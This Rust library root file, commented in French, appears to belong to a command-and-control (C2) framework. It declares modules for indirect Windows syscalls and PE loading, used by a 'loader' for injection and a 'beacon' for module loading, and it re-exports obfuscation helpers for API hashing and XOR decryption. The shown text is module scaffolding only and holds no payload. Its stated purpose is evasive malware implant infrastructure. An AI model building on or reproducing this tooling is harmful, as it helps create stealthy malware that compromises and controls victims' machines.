//! C2 Common Library
//!
//! Bibliothèque partagée pour le framework C2:
//! - `syscalls`: Indirect syscalls Windows x64
//! - `pe`: Parsing et loading de fichiers PE (DLL/EXE)
//!
//! Cette bibliothèque est utilisée par:
//! - `loader`: Pour l'injection initiale
//! - `beacon`: Pour le chargement dynamique de modules

// Note: On autorise le dead_code car ce module définit des constantes et structures
// selon la spécification Microsoft PE/COFF complète. Certains éléments (ex: PE32_MAGIC,
// IMAGE_FILE_MACHINE_I386, constantes 32-bit) ne sont pas utilisés car le projet
// cible uniquement x86_64, mais sont conservés pour référence et documentation.
#![allow(dead_code)]

pub mod pe;
pub mod syscalls;

// Re-export des macros importantes pour usage externe
pub use syscalls::obf::{djb2_hash, djb2_hash_str, xor_decrypt, XOR_KEY};
